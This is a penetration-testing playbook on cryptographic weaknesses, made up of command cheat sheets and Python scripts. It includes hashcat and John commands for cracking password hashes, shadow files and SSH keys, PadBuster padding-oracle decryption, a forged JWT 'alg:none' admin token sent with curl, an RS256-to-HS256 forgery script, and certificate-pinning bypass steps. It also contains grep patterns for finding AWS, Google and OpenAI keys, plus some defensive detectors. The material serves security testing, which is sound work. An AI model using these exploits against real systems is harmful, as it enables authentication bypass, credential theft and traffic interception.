# Cryptographic Vulnerabilities Playbook

## Indicators

Signs this vulnerability may be present:
- Password hashes using MD5, SHA1, or unsalted algorithms
- Fixed-length encrypted data suggesting ECB mode
- Encryption errors revealing padding information
- JWT tokens with `alg` header set to `HS256` or `none`
- Hardcoded encryption keys or API keys in source code
- Configuration files with base64-encoded secrets
- Identical ciphertext blocks in encrypted data
- Error messages mentioning padding, block size, or cryptographic operations
- TLS/SSL using deprecated protocols or weak cipher suites

## Tools

### Hashcat

```bash
# Identify hash type
hashid hash.txt
hashcat --identify hash.txt

# Common hash modes
# 0     - MD5
# 100   - SHA1
# 1000  - NTLM
# 1400  - SHA256
# 1700  - SHA512
# 1800  - sha512crypt (Unix)
# 3200  - bcrypt
# 500   - md5crypt (Unix)
# 5600  - NTLMv2
# 13100 - Kerberos TGS-REP (Kerberoast)
# 18200 - Kerberos AS-REP (AS-REP Roast)

# Crack MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack SHA1
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack with rules
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Crack with multiple rules
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule -r rules/toggles1.rule

# Brute force (8 character password)
hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a?a?a?a

# Mask attack (Password + 2 digits)
hashcat -m 0 hashes.txt -a 3 Password?d?d

# Combinator attack
hashcat -m 0 hashes.txt -a 1 wordlist1.txt wordlist2.txt

# Show cracked passwords
hashcat -m 0 hashes.txt --show

# Resume session
hashcat -m 0 hashes.txt --restore

# GPU benchmark
hashcat -b
```

### John the Ripper

```bash
# Auto-detect and crack
john hashes.txt

# Specify format
john --format=raw-md5 hashes.txt
john --format=raw-sha1 hashes.txt
john --format=bcrypt hashes.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# With rules
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

# Show cracked passwords
john --show hashes.txt

# List supported formats
john --list=formats

# Incremental mode (brute force)
john --incremental hashes.txt

# Crack Linux shadow file
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt

# Crack SSH private key
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack ZIP file
zip2john protected.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack PDF
pdf2john protected.pdf > pdf_hash.txt
john pdf_hash.txt
```

### PadBuster

```bash
# Install
git clone https://github.com/AonCyberLabs/PadBuster
cd PadBuster

# Basic padding oracle attack
perl padBuster.pl http://target.com/decrypt?cipher=CIPHERTEXT_HERE CIPHERTEXT_HERE 16

# With specific encoding
perl padBuster.pl http://target.com/decrypt?cipher=CIPHERTEXT CIPHERTEXT 16 -encoding 0

# Encoding options:
# 0 = Base64
# 1 = Lower Hex
# 2 = Upper Hex
# 3 = .NET UrlToken
# 4 = WebSafe Base64

# Encrypt plaintext
perl padBuster.pl http://target.com/decrypt?cipher=CIPHERTEXT CIPHERTEXT 16 -plaintext "admin=true"

# With cookies
perl padBuster.pl http://target.com/page CIPHERTEXT 16 -cookies "session=value"

# Specify error string
perl padBuster.pl http://target.com/page CIPHERTEXT 16 -error "padding"

# Brute force intermediate bytes
perl padBuster.pl http://target.com/page CIPHERTEXT 16 -bruteforce
```

### testssl.sh

```bash
# Install
git clone https://github.com/drwetter/testssl.sh
cd testssl.sh

# Full test
./testssl.sh https://target.com

# Test specific vulnerabilities
./testssl.sh --vulnerable https://target.com

# Test cipher suites
./testssl.sh --cipher-per-proto https://target.com

# Test for specific issues
./testssl.sh --heartbleed https://target.com
./testssl.sh --robot https://target.com
./testssl.sh --beast https://target.com
./testssl.sh --breach https://target.com
./testssl.sh --poodle https://target.com

# JSON output
./testssl.sh --json https://target.com

# Test STARTTLS
./testssl.sh --starttls smtp target.com:25
./testssl.sh --starttls imap target.com:143
```

### sslscan

```bash
# Basic scan
sslscan target.com

# Show certificate details
sslscan --show-certificate target.com

# Test specific port
sslscan target.com:8443

# XML output
sslscan --xml=output.xml target.com

# No color output
sslscan --no-colour target.com
```

### OpenSSL

```bash
# Test SSL/TLS connection
openssl s_client -connect target.com:443

# Test specific TLS version
openssl s_client -connect target.com:443 -tls1_2
openssl s_client -connect target.com:443 -tls1_3

# Show certificate
openssl s_client -connect target.com:443 -showcerts

# Test specific cipher
openssl s_client -connect target.com:443 -cipher 'ECDHE-RSA-AES256-GCM-SHA384'

# List available ciphers
openssl ciphers -v

# Generate hash
echo -n "password" | openssl md5
echo -n "password" | openssl sha256

# Encrypt/decrypt
openssl enc -aes-256-cbc -salt -in plaintext.txt -out encrypted.bin
openssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt

# RSA operations
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
openssl rsautl -encrypt -inkey public.pem -pubin -in plaintext.txt -out encrypted.bin
openssl rsautl -decrypt -inkey private.pem -in encrypted.bin -out decrypted.txt
```

## Techniques

### 1. Hash Identification and Cracking

```bash
# Identify hash type
# MD5: 32 hex characters (128 bits)
# SHA1: 40 hex characters (160 bits)
# SHA256: 64 hex characters (256 bits)
# SHA512: 128 hex characters (512 bits)
# bcrypt: starts with $2a$, $2b$, or $2y$
# md5crypt: starts with $1$
# sha512crypt: starts with $6$

# Example hashes:
# MD5: 5f4dcc3b5aa765d61d8327deb882cf99
# SHA1: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
# bcrypt: $2y$10$abcdefghijklmnopqrstuv.wxyz123456789ABCDEFGHIJKLMNO

# Use hashid for identification
hashid '5f4dcc3b5aa765d61d8327deb882cf99'

# Use hash-identifier
hash-identifier

# Crack with known wordlist
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Generate custom wordlist
# Using CeWL (extract words from website)
cewl http://target.com -w custom_wordlist.txt -d 2

# Using crunch (generate patterns)
crunch 8 8 -t @@@@%%%% -o passwords.txt  # 4 letters + 4 digits
crunch 6 6 abc123 -o short_wordlist.txt  # Using specific charset

# Rainbow table lookup (online)
# https://crackstation.net/
# https://hashes.com/en/decrypt/hash
```

### 2. Weak Hashing Detection

```python
#!/usr/bin/env python3
# Detect weak hashing in application
import hashlib
import re

# Patterns for weak hashes in code
weak_patterns = [
    r'md5\(',
    r'sha1\(',
    r'hashlib\.md5',
    r'hashlib\.sha1',
    r'MessageDigest\.getInstance\("MD5"\)',
    r'MessageDigest\.getInstance\("SHA-1"\)',
    r'Digest::MD5',
    r'Digest::SHA1',
    r'crypto\.createHash\([\'"]md5[\'"]\)',
    r'crypto\.createHash\([\'"]sha1[\'"]\)',
]

# Check if hash is unsalted
def check_unsalted(hash_value, password_list):
    """Check if hash matches any password without salt"""
    for password in password_list:
        if hashlib.md5(password.encode()).hexdigest() == hash_value:
            return f"Unsalted MD5 found: {password}"
        if hashlib.sha1(password.encode()).hexdigest() == hash_value:
            return f"Unsalted SHA1 found: {password}"
    return None

# Common passwords to test
common_passwords = ['password', '123456', 'admin', 'root', 'test']

# Test hash
test_hash = '5f4dcc3b5aa765d61d8327deb882cf99'  # MD5 of 'password'
result = check_unsalted(test_hash, common_passwords)
if result:
    print(f"[VULN] {result}")
```

### 3. Padding Oracle Attack

```bash
# Detect padding oracle vulnerability
# Look for different responses when padding is valid vs invalid

# Manual testing
# 1. Capture encrypted cookie/parameter
# 2. Modify last byte of ciphertext
# 3. Observe response differences

# Using PadBuster
perl padBuster.pl "http://target.com/decrypt?data=CIPHER" CIPHER 16

# If vulnerable, decrypt the ciphertext
perl padBuster.pl "http://target.com/decrypt?data=CIPHER" CIPHER 16 -plaintext "user=admin"

# Common indicators:
# - "Invalid padding" error
# - "Decryption failed" vs "Bad MAC"
# - Different response times
# - Different HTTP status codes
```

```python
#!/usr/bin/env python3
# Padding oracle detector
import requests
import sys

def test_padding_oracle(url, ciphertext_param, ciphertext):
    """Test for padding oracle vulnerability"""
    # Original request
    original = requests.get(f"{url}?{ciphertext_param}={ciphertext}")

    # Flip bits in last byte
    modified = bytearray.fromhex(ciphertext)
    modified[-1] ^= 0x01
    modified_hex = modified.hex()

    # Modified request
    response = requests.get(f"{url}?{ciphertext_param}={modified_hex}")

    if original.status_code != response.status_code:
        print(f"[VULN] Different status codes: {original.status_code} vs {response.status_code}")
        return True

    if len(original.text) != len(response.text):
        print(f"[VULN] Different response lengths: {len(original.text)} vs {len(response.text)}")
        return True

    # Check for padding-related error messages
    padding_errors = ['padding', 'decrypt', 'invalid', 'mac', 'pkcs']
    for error in padding_errors:
        if error.lower() in response.text.lower() and error.lower() not in original.text.lower():
            print(f"[VULN] Padding error message detected: {error}")
            return True

    return False

# Usage
# test_padding_oracle("http://target.com/api", "cipher", "encrypted_data_hex")
```

### 4. ECB Mode Detection

```python
#!/usr/bin/env python3
# Detect ECB mode encryption
import base64
from collections import Counter

def detect_ecb(ciphertext, block_size=16):
    """Detect ECB mode by looking for repeated blocks"""
    # Decode if base64
    try:
        data = base64.b64decode(ciphertext)
    except:
        data = bytes.fromhex(ciphertext) if all(c in '0123456789abcdefABCDEF' for c in ciphertext) else ciphertext.encode()

    # Split into blocks
    blocks = [data[i:i+block_size] for i in range(0, len(data), block_size)]

    # Count repeated blocks
    block_counts = Counter(blocks)
    repeated = {b: c for b, c in block_counts.items() if c > 1}

    if repeated:
        print(f"[VULN] ECB mode detected! {len(repeated)} repeated blocks found")
        return True

    return False

# Test with encryption oracle
def ecb_oracle_test(encrypt_function):
    """
    If you can encrypt arbitrary plaintext,
    send repeated blocks to detect ECB
    """
    # Send 32 bytes of 'A' (2 identical blocks)
    test_input = 'A' * 32
    ciphertext = encrypt_function(test_input)

    return detect_ecb(ciphertext)

# Example: Test encrypted data
test_cipher = "base64_encoded_ciphertext_here"
detect_ecb(test_cipher)
```

```bash
# Manual ECB detection
# Encrypt repeated plaintext and look for patterns
echo -n "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | \
  openssl enc -aes-128-ecb -K "00000000000000000000000000000000" | xxd

# If you see repeated hex blocks, ECB is being used
```

### 5. Hardcoded Key Detection

```bash
# Search for hardcoded keys in source code
grep -r "key\s*=\s*['\"][A-Fa-f0-9]\{32,\}['\"]" .
grep -r "secret\s*=\s*['\"]" .
grep -r "password\s*=\s*['\"]" .
grep -r "api_key\s*=\s*['\"]" .
grep -r "private_key" .

# Search for base64-encoded secrets
grep -rE "[A-Za-z0-9+/]{40,}={0,2}" . --include="*.py" --include="*.js" --include="*.java"

# Common patterns
grep -r "AKIA[0-9A-Z]{16}" .  # AWS Access Key
grep -r "AIza[0-9A-Za-z_-]{35}" .  # Google API Key
grep -r "sk-[a-zA-Z0-9]{32}" .  # OpenAI API Key

# Using truffleHog
trufflehog filesystem --directory=/path/to/repo

# Using gitleaks
gitleaks detect -s /path/to/repo

# Using detect-secrets
detect-secrets scan /path/to/repo
```

### 6. JWT Algorithm Confusion

```bash
# Decode JWT header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

# Algorithm confusion attack (alg:none)
# Change header to: {"alg":"none","typ":"JWT"}
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

# Construct token with empty signature
HEADER="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
PAYLOAD="eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9"
TOKEN="${HEADER}.${PAYLOAD}."

# Test with curl
curl -H "Authorization: Bearer $TOKEN" http://target.com/api/admin

# RS256 to HS256 confusion
# If server uses RS256 but accepts HS256,
# sign token with public key as HMAC secret

# Using jwt_tool
python3 jwt_tool.py JWT_TOKEN -X a  # Algorithm confusion tests
python3 jwt_tool.py JWT_TOKEN -X n  # None algorithm
python3 jwt_tool.py JWT_TOKEN -X s  # Sign with public key as HMAC

# Using jwt-cracker for weak secrets
jwt-cracker TOKEN /usr/share/wordlists/rockyou.txt
```

```python
#!/usr/bin/env python3
# JWT algorithm confusion attack
import jwt
import base64
import json

def decode_jwt_parts(token):
    """Decode JWT without verification"""
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return header, payload

def create_none_token(payload):
    """Create token with alg:none"""
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    return f"{header_b64}.{payload_b64}."

def rs256_to_hs256_attack(token, public_key):
    """
    If server accepts HS256 when expecting RS256,
    use public key as HMAC secret
    """
    header, payload = decode_jwt_parts(token)
    header['alg'] = 'HS256'

    # Sign with public key as secret
    return jwt.encode(payload, public_key, algorithm='HS256', headers={'typ': 'JWT'})

# Test payloads
test_payload = {"sub": "admin", "role": "admin", "exp": 9999999999}
none_token = create_none_token(test_payload)
print(f"None algorithm token: {none_token}")
```

### 7. IV/Nonce Reuse Detection

```python
#!/usr/bin/env python3
# Detect IV reuse in encrypted communications
from collections import defaultdict

def detect_iv_reuse(encrypted_messages):
    """
    Detect IV reuse by checking for identical cipher prefixes
    First block (IV) should be unique for each message
    """
    iv_map = defaultdict(list)
    block_size = 16

    for i, msg in enumerate(encrypted_messages):
        # Extract IV (first block)
        iv = msg[:block_size]
        iv_map[iv].append(i)

    reused = {iv: msgs for iv, msgs in iv_map.items() if len(msgs) > 1}

    if reused:
        print("[VULN] IV reuse detected!")
        for iv, msg_indices in reused.items():
            print(f"  IV {iv.hex()[:16]}... used in messages: {msg_indices}")
        return True

    return False

# For stream ciphers, keystream reuse allows XOR attack
def xor_ciphertexts(c1, c2):
    """XOR two ciphertexts encrypted with same key+nonce"""
    return bytes(a ^ b for a, b in zip(c1, c2))
    # Result is XOR of two plaintexts, which can be analyzed
```

### 8. Weak TLS Configuration

```bash
# Test for weak ciphers
nmap --script ssl-enum-ciphers -p 443 target.com

# Check for specific vulnerabilities
# POODLE (SSLv3)
openssl s_client -connect target.com:443 -ssl3 2>&1 | grep -i "ssl"

# BEAST (TLS 1.0 CBC)
openssl s_client -connect target.com:443 -tls1 2>&1 | grep -i "cipher"

# Heartbleed
nmap -p 443 --script ssl-heartbleed target.com

# ROBOT
python3 robot-detect.py target.com

# Test deprecated protocols
for proto in ssl2 ssl3 tls1 tls1_1; do
    echo "Testing $proto..."
    openssl s_client -connect target.com:443 -$proto 2>&1 | head -5
done

# Check certificate issues
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -dates -subject -issuer
```

### 9. Key Length Analysis

```python
#!/usr/bin/env python3
# Analyze encryption key strength
import math

def analyze_key_strength(key_hex):
    """Analyze key length and entropy"""
    key_bytes = bytes.fromhex(key_hex)
    key_bits = len(key_bytes) * 8

    print(f"Key length: {len(key_bytes)} bytes ({key_bits} bits)")

    # Check against standards
    if key_bits < 128:
        print("[VULN] Key too short! Minimum 128 bits recommended")
    elif key_bits == 128:
        print("[WARN] 128-bit key - Consider 256-bit for long-term security")
    else:
        print("[OK] Key length acceptable")

    # Check entropy (unique bytes)
    unique_bytes = len(set(key_bytes))
    entropy_ratio = unique_bytes / len(key_bytes)

    if entropy_ratio < 0.5:
        print(f"[VULN] Low entropy detected ({entropy_ratio:.2%})")

    return key_bits

# Example
analyze_key_strength("00000000000000000000000000000000")  # Weak key
analyze_key_strength("a1b2c3d4e5f6789012345678901234567890abcdef")  # Better
```

### 10. Certificate Pinning Bypass

```bash
# Android certificate pinning bypass with Frida
frida -U -l ssl-bypass.js -f com.target.app

# Common Frida scripts:
# - universal-ssl-bypass.js
# - ios-ssl-bypass.js
# - android-ssl-pinning-bypass.js

# Using objection
objection -g com.target.app explore
# Then: android sslpinning disable

# Using apktool to modify APK
apktool d target.apk
# Edit network_security_config.xml to trust user certificates
apktool b target -o modified.apk
jarsigner -keystore keystore.jks modified.apk alias

# Burp Suite setup for mobile
# 1. Export Burp CA certificate
# 2. Install on device as trusted certificate
# 3. Use Frida/objection to bypass pinning
```

## Bypass Techniques

### Hash Cracking Optimization

```bash
# Optimize hashcat performance
hashcat -m 0 hashes.txt wordlist.txt -O  # Optimized kernels
hashcat -m 0 hashes.txt wordlist.txt -w 3  # Workload profile (1-4)
hashcat -m 0 hashes.txt wordlist.txt --force  # Ignore warnings

# Use masks effectively
# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special, ?a = all
hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?l?l?d?d  # Capital + 5 lower + 2 digits
hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a?a --increment  # Incremental length

# Combine wordlist with mask (hybrid)
hashcat -m 0 hashes.txt -a 6 wordlist.txt ?d?d?d?d  # Word + 4 digits
hashcat -m 0 hashes.txt -a 7 ?d?d?d?d wordlist.txt  # 4 digits + word

# Use prince attack for password phrases
pp64.bin wordlist.txt | hashcat -m 0 hashes.txt
```

### Padding Oracle Optimization

```bash
# Speed up PadBuster
perl padBuster.pl URL CIPHER 16 -noIv -encoding 0 -threads 50

# Use padbuster alternatives
# Padding Oracle Attacker (faster)
python3 padattack.py -u "http://target.com/?data=" -c "CIPHER" -b 16

# Custom Python implementation for specific cases
```

### Weak Crypto Detection at Scale

```bash
# Scan repository for crypto issues
# Using Semgrep
semgrep --config "p/security-audit" /path/to/code

# Using Bandit (Python)
bandit -r /path/to/python/code -f json -o results.json

# Using FindSecBugs (Java)
findbugs -textui -effort:max -output results.txt target.jar

# Using crypto-detector
crypto-detector /path/to/code --output-file results.json
```

## Success Indicators

- Password hashes cracked revealing plaintext passwords
- Padding oracle attack successfully decrypts ciphertext
- ECB mode detected allowing block manipulation
- Hardcoded keys discovered in source code or configuration
- JWT algorithm confusion bypasses authentication
- IV/nonce reuse enables keystream recovery
- Weak TLS configuration allows downgrade attacks
- Certificate pinning bypassed enabling traffic interception
- Weak hash algorithms (MD5/SHA1) used for sensitive data
- Encryption keys with insufficient length or entropy
- Successful BEAST/POODLE/Heartbleed exploitation
- Rainbow table lookup matches unsalted hashes
